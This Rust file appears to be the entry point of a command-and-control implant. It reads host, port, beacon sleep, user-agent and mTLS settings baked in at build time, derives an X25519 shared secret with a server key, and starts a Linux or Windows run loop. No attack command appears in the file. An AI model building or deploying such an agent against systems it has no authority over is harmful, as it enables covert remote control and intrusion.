use x25519_dalek::PublicKey;

pub mod core;
pub mod config;
pub mod crypto;
pub mod utils;

#[cfg(target_os = "linux")]
use core::run_linux::run;
#[cfg(target_os = "windows")]
use core::run_windows::run;

use config::config::Config;
use crypto::aesgcm::{AES_GCM_KEY_LENGTH, decode, derive_shared_secret, generate_keypair, vec_u8_to_u8_32};

include!(concat!(env!("OUT_DIR"), "/init.rs"));

#[tokio::main]
async fn main() {
    let (
        proto,
        host,
        port,
        sleep,
        user_agent,
        https_root_cert,
        https_client_cert,
        https_client_key,
        server_public_key,
    ) = init();

    let server_public_key = decode(server_public_key.as_bytes());
    let server_public_key = vec_u8_to_u8_32(server_public_key).unwrap();
    let server_public_key = PublicKey::from(server_public_key);

    let (my_secret_key, my_public_key) = generate_keypair();
    let shared_secret = derive_shared_secret(my_secret_key.clone(), server_public_key.clone());

    let config = Config::new(
        proto.to_string(),
        host.to_string(),
        port,
        sleep,
        user_agent.to_string(),
        https_root_cert.to_string(),
        https_client_cert.to_string(),
        https_client_key.to_string(),
        server_public_key,
        my_secret_key,
        my_public_key,
        shared_secret,

    );
    run(config).await.unwrap()
}
